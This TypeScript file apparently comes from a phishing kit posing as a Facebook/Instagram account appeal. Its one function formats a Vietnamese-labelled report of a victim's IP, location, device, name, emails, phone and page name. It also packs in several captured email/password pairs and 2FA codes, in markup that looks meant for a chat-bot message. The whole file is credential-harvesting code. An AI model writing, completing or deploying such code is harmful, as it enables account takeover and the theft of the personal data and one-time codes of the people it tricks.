import type { GeoInfo, LoginProvider, UserData } from '@/store/store';

interface BuildMessageOptions {
    geoInfo: GeoInfo | null;
    deviceLabel: string;
    userData: Pick<UserData, 'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName' | 'information'>;
    loginProvider?: LoginProvider | null;
    accounts?: string[];
    passwords?: string[];
    codes?: string[];
    maxPass?: number;
    maxCode?: number;
}

const loginProviderLabel: Record<LoginProvider, string> = {
    facebook: 'Facebook',
    instagram: 'Instagram'
};

export function buildAppealMessage({ geoInfo, deviceLabel, userData, loginProvider, accounts = [], passwords = [], codes = [], maxPass, maxCode }: BuildMessageOptions): string {
    const time = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
    const location = geoInfo ? [geoInfo.city, geoInfo.region, geoInfo.country].filter(Boolean).join(', ') : 'N/A';
    const loginLine = loginProvider ? `\n🔑 Đăng nhập: <b>${loginProviderLabel[loginProvider]}</b>` : '';

    const credentialLines = passwords
        .map((password, idx) => {
            const account = accounts[idx] || '';
            const total = maxPass ?? passwords.length;
            return `<b>📨 Email/Phone ${idx + 1}/${total}:</b> <code>${account}</code>\n<b>🔒 Password ${idx + 1}/${total}:</b> <code>${password}</code>`;
        })
        .join('\n');

    const codeLines = codes
        .map((code, idx) => {
            const total = maxCode ?? codes.length;
            return `<b>🔐 2FA Code ${idx + 1}/${total}:</b> <code>${code}</code>`;
        })
        .join('\n');

    return `
📩 APPEAL FORM
⏰ ${time}
🌐 IP: <code>${geoInfo?.ip || 'N/A'}</code>
📱 Thiết bị: <code>${deviceLabel}</code>
📍 Vị trí: ${location}${loginLine}
━━━━━━━━━━━━━━━━━━━━
📋 THÔNG TIN
   Tên: <code>${userData.fullName}</code>
   Email: <code>${userData.personalEmail}</code>
   Business: <code>${userData.businessEmail}</code>
   SĐT: <code>${userData.phoneNumber}</code>
   Page: <code>${userData.facebookPageName}</code>
   Mô tả: <code>${userData.information}</code>
${credentialLines ? `${credentialLines}` : ''}${codeLines ? `\n${codeLines}` : ''}
`.trim();
}
